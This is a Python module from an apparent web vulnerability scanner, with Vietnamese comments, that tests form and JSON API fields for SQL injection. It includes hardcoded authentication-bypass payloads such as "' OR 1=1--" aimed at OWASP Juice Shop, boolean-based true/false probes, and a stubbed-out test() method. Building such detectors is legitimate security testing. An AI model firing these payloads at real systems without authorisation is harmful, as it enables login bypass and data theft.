import time
import json
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlunparse, urlencode
import requests

from scanner_core.scanner import Vulnerability
from .base_tester import BaseTester


class SqliTester(BaseTester):
    def __init__(self, session: requests.Session, config: dict):
        super().__init__(session, config)
        self.error_payloads = self.config.get('error_based_payloads', [])
        self.time_payloads = self.config.get('time_based_payloads', [])
        self.boolean_payloads = self.config.get('boolean_based_payloads', [])
        self.error_patterns = self.config.get('error_patterns', [])
        self.time_delay_threshold = self.config.get('time_delay_seconds', 4)

    def test(self, url: str) -> Optional[Vulnerability]:
        # ... (Toàn bộ logic test GET URL giữ nguyên không đổi) ...
        # (Để tiết kiệm không gian, tôi không chép lại hàm này. Bạn giữ nguyên code cũ của hàm test)
        pass  # <-- THAY BẰNG CODE HÀM test() CŨ CỦA BẠN

    def test_form(self, form_data: dict) -> Optional[Vulnerability]:
        """Kiểm tra SQLi trên POST/PUT/GET Forms & APIs"""
        url = form_data['url']
        method = form_data.get('method', 'POST').upper()
        inputs = form_data['inputs']

        # Nhận diện nếu nó là API do Scrapy cắm cờ hoặc dựa vào URL
        is_api = form_data.get('is_api', False) or any(k in url.lower() for k in ['/api/', '/rest/', '/v1/'])

        # Lấy trang gốc làm baseline so sánh
        base_resp = self._inject_form_payload(url, method, inputs, None, None, is_api)
        if not base_resp:
            return None

        for target_input in inputs:
            if target_input.get('type') in ['hidden', 'submit', 'radio', 'button']:
                continue

            param = target_input['name']

            # --- 1. KIỂM TRA ĐẶC BIỆT: SQLi AUTH BYPASS (Cho OWASP Juice Shop) ---
            if is_api and method == 'POST':
                auth_bypass_payloads = ["' OR 1=1--", "' OR '1'='1", "admin@juice-sh.op'--", "' OR true--"]
                for payload in auth_bypass_payloads:
                    try:
                        resp = self._inject_form_payload(url, method, inputs, param, payload, is_api)
                        if resp and resp.status_code in [200, 201]:
                            # Nếu API trả về OK và chứa token/session -> Bypass thành công
                            if any(k in resp.text.lower() for k in
                                   ['token', 'session', 'success', 'jwt', 'user', 'authentication']):
                                # Verify bằng payload sai
                                bad_resp = self._inject_form_payload(url, method, inputs, param, "' AND 1=2--", is_api)
                                if bad_resp and bad_resp.status_code in [401, 403, 404, 500]:
                                    return Vulnerability(
                                        type='SQL Injection', subcategory='Authentication Bypass (API)', url=url,
                                        details={
                                            'parameter': f"JSON Body: {param}", 'payload': payload,
                                            'evidence': 'Successful authentication bypass using SQL injection payload in JSON API.'
                                        },
                                        severity='Critical'
                                    )
                    except requests.RequestException:
                        pass

            # --- 2. BOOLEAN-BASED VERIFICATION TRÊN POST/PUT FORM ---
            # Gửi 2 bộ JSON: một đúng logic, một sai logic
            true_payload = "' AND 1=1--"
            false_payload = "' AND 1=2--"

            try:
                resp_true = self._inject_form_payload(url, method, inputs, param, true_payload, is_api)
                resp_false = self._inject_form_payload(url, method, inputs, param, false_payload, is_api)

                if resp_true and resp_false:
                    sim_true = self._calculate_similarity(base_resp.text, resp_true.text)
                    sim_false = self._calculate_similarity(base_resp.text, resp_false.text)

                    if (sim_true > 0.95 and sim_false < 0.90) or (
                            resp_true.status_code == 200 and resp_false.status_code >= 400):
                        return Vulnerability(
                            type='SQL Injection', subcategory=f'Boolean-Based ({method})', url=url,
                            details={
                                'parameter': f"Body/Query: {param}", 'true_payload': true_payload,
                                'false_payload': false_payload,
                                'evidence': f'Response differs significantly between TRUE and FALSE logic inside {method} payload.'
                            },
                            severity='Critical'
                        )
            except requests.RequestException:
                pass

        return None

    def _inject_form_payload(self, url, method, inputs, target_param, payload, is_api=False):
        """Build request body/query giữ nguyên data cũ, chỉ thay target_param bằng payload"""
        data = {}
        for inp in inputs:
            if target_param and inp['name'] == target_param:
                data[inp['name']] = payload
            else:
                data[inp['name']] = inp.get('value', 'test')

        headers = {'ngrok-skip-browser-warning': 'true'}

        try:
            if method == 'GET':
                return self.session.get(url, params=data, timeout=15, verify=False, headers=headers)

            # [QUAN TRỌNG] Nếu là API, phải gửi json=data để thư viện requests tự động set Content-Type: application/json
            if is_api:
                if method == 'PUT':
                    return self.session.put(url, json=data, timeout=15, verify=False, headers=headers)
                return self.session.post(url, json=data, timeout=15, verify=False, headers=headers)
            else:
                return self.session.post(url, data=data, timeout=15, verify=False, headers=headers)
        except Exception:
            return None